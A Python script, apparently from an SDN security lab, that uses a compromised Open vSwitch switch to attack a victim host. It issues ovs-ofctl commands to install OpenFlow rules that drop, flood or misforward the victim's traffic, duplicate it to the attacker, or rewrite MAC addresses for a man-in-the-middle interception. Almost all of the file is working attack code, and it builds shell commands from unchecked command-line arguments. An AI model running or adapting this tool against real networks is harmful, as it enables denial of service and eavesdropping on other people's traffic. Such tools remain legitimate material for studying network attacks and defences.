import socket
import sys
import re
import random
from subprocess import check_output
from subprocess import call

# This programm perform some of data-plane attacks, which use comromised switch
# To perform attack, you should give some parametres:
# 1) Victim's MAC address
# 2) MAC address of victim's interlocutor
# 3) Type of attack, which can be one of the follows: drop, flood, 
# incorrect_forwarding, duplicate, MitM

# Attack type
atk_type = str(sys.argv[1])
# Attack switch
atk_switch = sys.argv[2]
# Mode of attack
mode = sys.argv[3]
# Attack victim
victim_mac = sys.argv[4]
# Receiver of victim's messages
victim_rec_mac = sys.argv[5]
  
#flows = check_output("ovs-ofctl -O OpenFlow13 dump-flows " + str(atk_switch), shell=True)


if atk_type == 'drop':
    # Packet drop attack
    if mode == 'mod-flows':
      call("ovs-ofctl -O OpenFlow13 del-flows " + str(atk_switch) + " dl_dst=" + str(victim_mac), shell=True)
      mode = 'add-flow'
    call("ovs-ofctl -O OpenFlow13 "+mode+" " + str(atk_switch) + " priority=100,dl_dst=" + str(victim_mac) + ",actions=drop", shell=True)
    print("dl_dst="+str(victim_mac) + " actions=drop")

elif atk_type == 'flood':
    # Flood attack
    if mode == 'mod-flows':
      call("ovs-ofctl -O OpenFlow13 del-flows " + str(atk_switch) + " dl_dst=" + str(victim_mac), shell=True)
      mode = 'add-flow'
    call("ovs-ofctl -O OpenFlow13 "+mode+" " + str(atk_switch) + " priority=100,dl_dst=" + str(victim_mac) + ",actions=flood", shell=True)
    print("dl_dst="+str(victim_mac) + " actions=FLOOD")

elif atk_type == 'incorrect_forwarding':
    # Incorrect forwarding attack
    if mode == 'mod-flows':
      call("ovs-ofctl -O OpenFlow13 del-flows " + str(atk_switch) + " dl_dst=" + str(victim_mac), shell=True)
      mode = 'add-flow'
    call("ovs-ofctl -O OpenFlow13 "+mode+" " + str(atk_switch) + " priority=100,dl_dst=" + str(victim_mac) + ",actions=output:1", shell=True)
    print("dl_dst="+str(victim_mac) + " actions=output:1")

else:
    server_addr = sys.argv[6].split('h')
    ip_addr = set()
    for addr in server_addr:
      ip_addr.add(addr)

    for i in ip_addr:
        # Try to connet to next host
        sock = socket.socket()
        sock.connect(("10.0.0." + str(i), 5555))
        sock.send("Message")
        sock.close()
#        call("ping 10.0.0." + str(i) + " &", shell=True)

        # Check if connection line went through corrupted switch
        result = check_output("ifconfig", shell=True)
#        num = result.find('HWaddr ')
#        my_mac = result[num + 7: num + 7 + len(victim_mac)]
        my_mac = re.findall(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', result)[0]
        print(my_mac)

        # Receiver mac, for changig rule for another side
        result = check_output("arp -a", shell=True)
        arp_list = result.split('\n')
        for arp_elem in arp_list:
          find_ip = re.findall(r'10.0.0.' + str(i), arp_elem)
          if find_ip:
            rec_mac = re.findall(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', arp_elem)[0]
            break
#        num = result.find('10.0.0.' + str(i))
#        rec_mac = result[num + len('10.0.0.' + str(i)) + 5: num + len('10.0.0.' + str(i)) + 5 + len(victim_mac)]
        print(rec_mac)

        my_port = 0
        victim_port = 0
        result = check_output("ovs-ofctl -O OpenFlow13 dump-flows " + str(atk_switch), shell=True) 

        rule_list = result.split('\n');
        for rule in rule_list:
            flow_list = re.findall(r'dl_dst=' + my_mac, rule)
            if flow_list:
                my_port_str = re.findall(r'output:\d*', rule)[0]
                my_port = int(re.findall(r'\d+', my_port_str)[0])
#        shift = result.find(my_mac)
#        if shift != -1:
#            num = result.find('actions=write_actions(output:', shift)
#            if num != -1:
#                my_port = result[num + len('actions=write_actions(output:')]

        # If we found our connection, we can stop searching and change rules
        if my_port != 0:
            # To find rule for another side
#            my_str_port = ':' + str(my_port) + ' '
            result = check_output("ovs-ofctl -O OpenFlow13 dump-flows " + str(atk_switch), shell=True) 

            rule_list = result.split('\n');
            for rule in rule_list:
                flow_list = re.findall(r'dl_dst=' + victim_mac, rule)
                if flow_list:
                    victim_port = re.findall(r'output:\d*', rule)[0]
                    victim_port = int(re.findall(r'\d+', victim_port)[0])

#            shift = result.find(victim_mac)
#            if shift != -1:
#                num = result.find('actions=write_actions(output:', shift, 
#                      shift+100)
#                if num != -1:
#                    victim_port = result[num + len('actions=write_actions(output:')]

            if atk_type == 'duplicate':
                # Duplicate forwarding attack
                if mode == 'mod-flows':
                    call("ovs-ofctl -O OpenFlow13 del-flows " + str(atk_switch) + " dl_dst=" + str(victim_mac) + ",actions=output:" + str(victim_port), shell=True)
                    mode = 'add-flow'

                call("ovs-ofctl -O OpenFlow13 "+mode+" " + str(atk_switch) + " priority=100,dl_dst=" + str(victim_mac) + ",actions=output:" + str(victim_port) + ",mod_dl_dst:" + str(my_mac) + ",mod_dl_src:" + str(rec_mac) + ",output:" + str(my_port) + ",goto_table:1", shell=True)
                print("dl_dst="+str(victim_mac) + " actions=output:" + str(victim_port) + " mod_dl_dst:" + str(my_mac) + " mod_dl_src:" + str(rec_mac) + " output:" + str(my_port) + ",goto_table:1")
#                call("ovs-ofctl -O OpenFlow13 "+mode+" " + str(atk_switch) + " dl_dst=" + str(victim_mac) + ",actions=output:" + str(victim_port) + ",mod_dl_dst:" + str(my_mac) + ",mod_dl_src:" + str(rec_mac) + ",output:" + str(my_port) + ",goto_table:1", shell=True)

            elif atk_type == 'MitM':
                # Man-in-the-Middle attack
                call("ovs-ofctl -O OpenFlow13 "+mode+" " + str(atk_switch) + " dl_dst=" + str(victim_mac) + ",actions=mod_dl_dst:" + str(my_mac) + ",mod_dl_src:" + str(rec_mac) + ",output:" + str(my_port), shell=True)
                call("ovs-ofctl -O OpenFlow13 mod-flows " + str(atk_switch) + " dl_dst=" + str(rec_mac) + ",actions=mod_dl_dst:" + str(victim_mac) + ",mod_dl_src:" + str(victim_rec_mac) + ",output:" + str(victim_port), shell=True)

            break
